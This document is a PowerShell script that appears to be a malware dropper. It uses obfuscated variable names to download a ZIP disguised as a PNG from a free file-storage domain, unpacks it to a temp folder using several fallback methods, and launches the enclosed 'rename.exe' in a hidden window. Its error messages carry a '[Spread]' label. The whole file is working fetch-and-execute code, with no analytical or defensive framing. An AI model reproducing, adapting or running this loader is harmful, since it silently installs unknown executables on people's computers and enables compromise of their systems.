$tBHRLNqrxNvpAfQn = "https://file.freestorage-04.bond/files/2026/10/5/4b68e7a8-adee-47d1-bd85-4c22e06b1d48/zzz.png?srl=sSOsEtVrGmndjhVDdHNVKA&exp=1791248206"
$un4yX9B1 = [System.IO.Path]::GetRandomFileName().Replace('.','')
$sMpFuCP_rfYIUcACJx = [System.IO.Path]::GetTempPath()
$WLMI_FZbKoFTc3LGf97p = Join-Path $sMpFuCP_rfYIUcACJx ("$un4yX9B1" + ".zip")
$w9Ls4erH6HAJ58mxRt2 = Join-Path $sMpFuCP_rfYIUcACJx $un4yX9B1
$HENbGGuEQC7yMYO4K = "rename.exe"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch { }

function _spreadStop {
    param([string]$Reason)
    Write-Host ('[Spread] ' + $Reason) -ForegroundColor Red
    try {
        if ($Host.Name -eq 'ConsoleHost' -and [Environment]::UserInteractive) {
            Read-Host 'Press Enter to exit'
        } else {
            Start-Sleep -Seconds 8
        }
    } catch {
        Start-Sleep -Seconds 8
    }
    exit 1
}

if (Test-Path -LiteralPath $w9Ls4erH6HAJ58mxRt2) {
    Remove-Item -LiteralPath $w9Ls4erH6HAJ58mxRt2 -Recurse -Force -ErrorAction SilentlyContinue
}

$dlOk = $false
try {
    Start-BitsTransfer -Source $tBHRLNqrxNvpAfQn -Destination $WLMI_FZbKoFTc3LGf97p -ErrorAction Stop
    $dlOk = $true
} catch { }
if (-not $dlOk) {
    try {
        (New-Object Net.WebClient).DownloadFile($tBHRLNqrxNvpAfQn, $WLMI_FZbKoFTc3LGf97p)
        $dlOk = $true
    } catch { }
}
if (-not $dlOk) {
    try {
        Invoke-WebRequest -Uri $tBHRLNqrxNvpAfQn -OutFile $WLMI_FZbKoFTc3LGf97p -UseBasicParsing
        $dlOk = $true
    } catch {
        _spreadStop 'All download methods failed (BITS / WebClient / Invoke-WebRequest).'
    }
}

if (-not (Test-Path -LiteralPath $WLMI_FZbKoFTc3LGf97p)) {
    _spreadStop 'ZIP was not saved to temp — check URL, firewall, TLS.'
}
$bytes = [IO.File]::ReadAllBytes($WLMI_FZbKoFTc3LGf97p)
if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
    $trimmed = New-Object byte[] ($bytes.Length - 3)
    [Array]::Copy($bytes, 3, $trimmed, 0, $trimmed.Length)
    [IO.File]::WriteAllBytes($WLMI_FZbKoFTc3LGf97p, $trimmed)
    $bytes = $trimmed
}
if ($bytes.Length -lt 4 -or $bytes[0] -ne 0x50 -or $bytes[1] -ne 0x4B) {
    _spreadStop ('Not a ZIP (bad file or block). First bytes: {0} {1}' -f $bytes[0], $bytes[1])
}

$unzipped = $false
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
    [System.IO.Compression.ZipFile]::ExtractToDirectory($WLMI_FZbKoFTc3LGf97p, $w9Ls4erH6HAJ58mxRt2)
    $unzipped = $true
} catch { }
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $w9Ls4erH6HAJ58mxRt2) {
            Remove-Item -LiteralPath $w9Ls4erH6HAJ58mxRt2 -Recurse -Force -ErrorAction SilentlyContinue
        }
        Expand-Archive -LiteralPath $WLMI_FZbKoFTc3LGf97p -DestinationPath $w9Ls4erH6HAJ58mxRt2 -Force
        $unzipped = $true
    } catch { }
}
if (-not $unzipped) {
    try {
        if (Test-Path -LiteralPath $w9Ls4erH6HAJ58mxRt2) {
            Remove-Item -LiteralPath $w9Ls4erH6HAJ58mxRt2 -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType Directory -Path $w9Ls4erH6HAJ58mxRt2 -Force | Out-Null
        $shell = New-Object -ComObject Shell.Application
        $zip_file = $shell.NameSpace((Resolve-Path $WLMI_FZbKoFTc3LGf97p).Path)
        $destination = $shell.NameSpace((Resolve-Path $w9Ls4erH6HAJ58mxRt2).Path)
        $destination.CopyHere($zip_file.Items(), 0x14)
        $maxAttempts = 120
        $attempt = 0
        while ($attempt -lt $maxAttempts -and -not (Test-Path -LiteralPath (Join-Path $w9Ls4erH6HAJ58mxRt2 $HENbGGuEQC7yMYO4K))) {
            Start-Sleep -Milliseconds 500
            $attempt++
        }
        if (Test-Path -LiteralPath (Join-Path $w9Ls4erH6HAJ58mxRt2 $HENbGGuEQC7yMYO4K)) { $unzipped = $true }
    } catch { }
}
if (-not $unzipped) {
    _spreadStop 'Could not unzip (ZipFile / Expand-Archive / Shell all failed).'
}

$exePath = Join-Path $w9Ls4erH6HAJ58mxRt2 $HENbGGuEQC7yMYO4K
if (-not (Test-Path -LiteralPath $exePath)) {
    _spreadStop ('EXE not found: ' + $exePath)
}

$xVmj612H = (Get-Location).Path
Set-Location -LiteralPath $w9Ls4erH6HAJ58mxRt2
try {
    $qbtVh_yWI3UR0vop7p = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
} catch {
    _spreadStop ('Could not start rename.exe: ' + $_.Exception.Message)
} finally {
    if ($xVmj612H) { Set-Location -LiteralPath $xVmj612H }
}
